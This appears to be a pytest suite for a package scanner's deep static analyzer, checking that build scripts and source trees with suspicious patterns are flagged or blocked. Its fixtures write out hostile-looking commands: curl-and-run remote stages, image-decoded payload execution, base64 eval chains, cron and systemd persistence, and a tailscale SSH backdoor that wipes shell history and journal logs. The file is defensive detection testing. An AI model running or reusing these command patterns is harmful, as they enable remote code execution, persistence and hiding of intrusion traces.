import io
import tarfile
from pathlib import Path

from aurascan.analyzers.deep_static import DeepStaticAnalyzer
from aurascan.core.models import AnalysisResult, Confidence, EvidenceQuality, Finding, Phase, Severity, Source


class FakeClamAV:
    def __init__(self):
        self.archive_paths = []
        self.unpacked_paths = []

    def scan_source_archive(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.archive_paths.append(path)
        return AnalysisResult(True, "clean", [])

    def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.unpacked_paths.append(path)
        return AnalysisResult(True, "clean", [])


class FindingClamAV(FakeClamAV):
    def scan_source_archive(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.archive_paths.append(path)
        return AnalysisResult(False, "infected", [Finding(
            rule_id="CLAMAV-TestSig",
            package_name="pkg",
            package_version="1",
            phase=Phase.source_archive_scan,
            source=Source.clamav,
            severity=Severity.CRITICAL,
            confidence=Confidence.CONFIRMED,
            evidence_quality=EvidenceQuality.confirmed_signature,
            file_path=path,
            explanation="signature",
            recommendation="block",
            blocks_installation=True,
            requires_manual_review=False,
            raw_output=f"{path}: TestSig FOUND",
        )])

    def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.unpacked_paths.append(path)
        return AnalysisResult(False, "infected", [Finding(
            rule_id="CLAMAV-TreeSig",
            package_name="pkg",
            package_version="1",
            phase=Phase.unpacked_source_scan,
            source=Source.clamav,
            severity=Severity.CRITICAL,
            confidence=Confidence.CONFIRMED,
            evidence_quality=EvidenceQuality.confirmed_signature,
            file_path=path,
            explanation="signature",
            recommendation="block",
            blocks_installation=True,
            requires_manual_review=False,
            raw_output=f"{path}: TreeSig FOUND",
        )])


class TrackingExtractor:
    def __init__(self, target):
        self.target = target
        self.called = False

    def extract(self, path):
        self.called = True
        return self.target, []


def write_tar(path: Path, entries):
    with tarfile.open(path, "w") as archive:
        for name, content, mode in entries:
            data = content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = mode
            archive.addfile(info, io.BytesIO(data))


def test_deep_static_does_not_execute_package_functions(tmp_path: Path):
    archive = tmp_path / "src.tar"
    marker = tmp_path / "executed"
    write_tar(archive, [("setup.py", f"import subprocess\nfrom pathlib import Path\nPath({str(marker)!r}).write_text('bad')\n", 0o755)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert marker.exists() is False
    assert any(f.rule_id == "DEEPSTATIC-SETUPPY-SUSPICIOUS" for f in result.findings)


def test_dynamic_declared_source_fails_closed_without_shell_evaluation(tmp_path: Path):
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(
        'pkgname=demo\nsource=("https://example.invalid/$(printf fixture).tar")\n',
        encoding="utf-8",
    )

    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(
        str(pkgbuild),
        pkgbuild.read_text(encoding="utf-8"),
    )

    finding = next(f for f in result.findings if f.rule_id == "SOURCE-PARSER-AMBIGUOUS")
    assert result.is_safe is False
    assert finding.severity == Severity.HIGH
    assert finding.blocks_installation is True
    assert "printf fixture" not in finding.evidence_snippet


def test_unsupported_declared_source_fails_closed(tmp_path: Path):
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(
        'pkgname=demo\nsource=("git://example.invalid/repo.git")\nsha256sums=(SKIP)\n',
        encoding="utf-8",
    )

    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(
        str(pkgbuild),
        pkgbuild.read_text(encoding="utf-8"),
    )

    assert result.is_safe is False
    assert any(
        f.rule_id == "SOURCE-UNSUPPORTED" and f.blocks_installation
        for f in result.findings
    )


def test_source_archive_clamav_phase_is_reported(tmp_path: Path):
    archive = tmp_path / "src.tar"
    write_tar(archive, [("file.txt", "hello", 0o644)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    result = DeepStaticAnalyzer(clamav=FindingClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert any(f.source == Source.clamav and f.phase == Phase.source_archive_scan for f in result.findings)


def test_unpacked_source_clamav_phase_is_reported(tmp_path: Path):
    source = tmp_path / "unpacked"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\techo harmless\n")
    archive = tmp_path / "src.tar"
    write_tar(archive, [("Makefile", "all:\n\techo harmless\n", 0o644)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    class TreeOnlyClamAV(FakeClamAV):
        def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
            self.unpacked_paths.append(path)
            return FindingClamAV().scan_unpacked_source(path)

    result = DeepStaticAnalyzer(clamav=TreeOnlyClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert any(f.source == Source.clamav and f.phase == Phase.unpacked_source_scan for f in result.findings)


def test_safe_archive_extractor_is_used_by_deep_static_path(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\techo harmless\n")
    archive = tmp_path / "src.tar"
    archive.write_text("fake archive placeholder")
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")
    extractor = TrackingExtractor(source)

    DeepStaticAnalyzer(extractor=extractor, clamav=FakeClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert extractor.called is True


def test_suspicious_package_json_script_scanned_as_text_only(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "package.json").write_text('{"scripts": {"postinstall": "curl https://example.invalid/x"}}')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-NPM-INSTALL-SCRIPT" for f in findings)


def test_hostile_package_json_shapes_fail_closed_without_crashing(tmp_path: Path):
    for index, payload in enumerate((
        "[]",
        '{"scripts":"postinstall"}',
        '{"scripts":{"postinstall":[]}}',
        '{"dependencies":[],"devDependencies":{}}',
    )):
        source = tmp_path / f"source-{index}"
        source.mkdir()
        (source / "package.json").write_text(payload)

        findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

        incomplete = next(
            finding
            for finding in findings
            if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
        )
        assert incomplete.blocks_installation is True


def test_credential_reference_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("echo ~/.ssh/id_example\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-CREDENTIAL-PATH" and f.blocks_installation for f in findings)


def test_network_fetch_in_makefile_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\tcurl https://example.invalid/payload.sh -o payload.sh\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-NETWORK-FETCH" for f in findings)


def test_vendored_executable_text_is_still_bounded_and_analyzed(tmp_path: Path):
    source = tmp_path / "source"
    script = source / "vendor" / "fixture" / "loader.sh"
    script.parent.mkdir(parents=True)
    script.write_text(
        "curl https://example.invalid/fixture -o fixture-stage\n"
        "sh fixture-stage\n",
        encoding="utf-8",
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-VENDORED-DEPS" for f in findings)
    staged = next(
        f for f in findings if f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001"
    )
    assert staged.severity == Severity.CRITICAL
    assert staged.blocks_installation is True


def test_remote_stage_execution_in_acquired_source_is_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text(
        "curl https://example.invalid/fixture -o fixture.carrier\n"
        "xxd -r fixture.carrier fixture-stage\n"
        "./fixture-stage\n"
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    staged = next(f for f in findings if f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001")
    assert staged.severity == Severity.CRITICAL
    assert staged.blocks_installation is True
    assert staged.line_number == 1
    assert "example.invalid" not in staged.evidence_snippet
    assert "fixture-stage" not in staged.evidence_snippet
    assert not any(
        f.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001" for f in findings
    )


def test_remote_stage_documentation_or_unexecuted_download_is_not_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text(
        "# curl https://example.invalid/fixture -o fixture-stage; sh fixture-stage\n"
        "printf '%s\\n' 'curl https://example.invalid/fixture -o fixture-stage; sh fixture-stage'\n"
        "curl https://example.invalid/archive -o source.tar\n"
        "install -Dm644 source.tar \"$DESTDIR/usr/share/fixture/source.tar\"\n"
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001" for f in findings)


def test_remote_stage_command_bound_fails_deep_static_closed(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text("true;" * 16385)

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    incomplete = next(
        finding
        for finding in findings
        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
    )
    assert incomplete.blocks_installation is True


def test_local_carrier_decode_then_execution_in_source_is_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text(
        "xxd -r resources/banner.png generated-stage\n"
        "./generated-stage\n"
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    carrier = next(
        item
        for item in findings
        if item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
    )
    assert carrier.severity == Severity.CRITICAL
    assert carrier.blocks_installation is True
    assert carrier.line_number == 1
    assert "banner" not in carrier.evidence_snippet
    assert "generated-stage" not in carrier.evidence_snippet


def test_media_named_interpreter_input_in_source_is_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text("python3 resources/preview.jpg\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    carrier = next(
        item
        for item in findings
        if item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
    )
    assert carrier.severity == Severity.CRITICAL
    assert carrier.blocks_installation is True


def test_inert_carriers_and_normal_scripts_in_source_are_not_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "bootstrap.sh").write_text(
        "# bash resources/preview.jpg\n"
        "printf '%s\\n' 'python3 resources/preview.jpg'\n"
        "base64 -d resources/preview.jpg > generated-stage\n"
        "install -Dm644 generated-stage \"$DESTDIR/usr/share/demo/generated-stage\"\n"
        "convert resources/preview.jpg resources/thumbnail.webp\n"
        "python3 scripts/build.py\n"
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(
        item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
        for item in findings
    )


def test_eval_chain_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text('eval "$(printf fixture | base64 -d)"\n')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-EVAL-CHAIN" for f in findings)


def test_systemd_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("systemctl enable fixture.service\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    auto = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_unit_file_in_source_tree_is_lower_severity(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "fixture.service").write_text("[Unit]\nDescription=Fixture\n[Service]\nExecStart=/usr/bin/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    unit = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False
    assert not any(f.rule_id == "DEEPSTATIC-SYSTEMD-AUTO-001" for f in findings)


def test_systemd_user_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("install -Dm644 fixture.service \"$HOME/.config/systemd/user/fixture.service\"\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    user = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-USER-001")
    assert user.severity == Severity.HIGH
    assert user.requires_manual_review is True
    assert not any(f.rule_id == "DEEPSTATIC-CREDENTIAL-PATH" for f in findings)


def test_systemd_documentation_comment_does_not_trigger_high_risk_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("# Documentation: systemctl enable fixture.service\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id.startswith("DEEPSTATIC-SYSTEMD-") for f in findings)


def test_cron_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("@reboot curl https://example.invalid/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-CRON-PERSISTENCE" for f in findings)


def test_deep_static_comment_only_eval_does_not_trigger(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text('# eval "$(curl https://example.invalid/fixture)"\n')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-EVAL-CHAIN" for f in findings)


def test_cron_documentation_comment_does_not_trigger_high_risk_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("# Documentation: @reboot curl https://example.invalid/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-CRON-PERSISTENCE" for f in findings)


def test_correlated_remote_admin_backdoor_in_source_is_blocked(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    script = source / "hyprland-fixes"
    script.write_text(
        "#!/bin/bash\n"
        "tailscale up --authkey=fixture-only --ssh\n"
        "/usr/sbin/sshd -D -f /etc/pacman.d/fixture-sshd\n"
        "truncate -s 0 /root/.bash_history\n"
    )
    script.chmod(0o644)

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    backdoor = next(f for f in findings if f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001")
    assert backdoor.severity == Severity.CRITICAL
    assert backdoor.blocks_installation is True
    assert "fixture-only" not in backdoor.evidence_snippet


def test_non_executable_extensionless_shebang_source_is_inspected(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    script = source / "extensionless-helper"
    script.write_text(
        "#!/bin/sh\n"
        "tailscale up --auth-key=fixture-only --ssh\n"
        "journalctl --vacuum-time=1s\n"
    )
    script.chmod(0o644)

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001" for f in findings)


def test_deep_static_does_not_follow_extensionless_source_symlink(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    outside = tmp_path / "outside-helper"
    outside.write_text(
        "#!/bin/sh\n"
        "tailscale up --auth-key=fixture-only --ssh\n"
        "journalctl --vacuum-time=1s\n"
    )
    (source / "extensionless-helper").symlink_to(outside)

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001" for f in findings)
    incomplete = next(
        finding
        for finding in findings
        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
    )
    assert incomplete.blocks_installation is True


def test_deep_static_fails_closed_when_tree_entry_bound_is_exceeded(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    for index in range(4):
        (source / f"script-{index}.sh").write_text("printf 'bounded fixture\\n'\n")

    findings = DeepStaticAnalyzer(
        clamav=FakeClamAV(),
        max_tree_entries=3,
    ).inspect_source_tree(source)

    incomplete = next(
        finding
        for finding in findings
        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
    )
    assert incomplete.severity == Severity.HIGH
    assert incomplete.blocks_installation is True
    assert "script-" not in incomplete.evidence_snippet


def test_deep_static_fails_closed_when_candidate_exceeds_file_bound(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_bytes(b"x" * 33)

    findings = DeepStaticAnalyzer(
        clamav=FakeClamAV(),
        max_file_size=32,
    ).inspect_source_tree(source)

    assert any(
        finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
        and finding.blocks_installation
        for finding in findings
    )


def test_deep_static_fails_closed_on_uninspected_nested_archive(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    nested = source / "payload.zip"
    nested.write_bytes(b"inert nested archive fixture")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    finding = next(
        item
        for item in findings
        if item.rule_id == "DEEPSTATIC-NESTED-ARCHIVE-UNINSPECTED-001"
    )
    assert finding.severity == Severity.HIGH
    assert finding.blocks_installation is True
    assert "payload.zip" not in finding.evidence_snippet


def test_deep_static_tailscale_ssh_without_auth_key_is_not_backdoor_match(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "setup.sh").write_text("tailscale up --ssh\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001" for f in findings)


def test_deep_static_trailing_comment_is_not_remote_access_anchor(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "setup.sh").write_text(
        "true # /etc/pacman.d/fixture Port 3333 PermitRootLogin yes\n"
        "chmod 4755 /tmp/fixture-helper\n"
    )

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001" for f in findings)
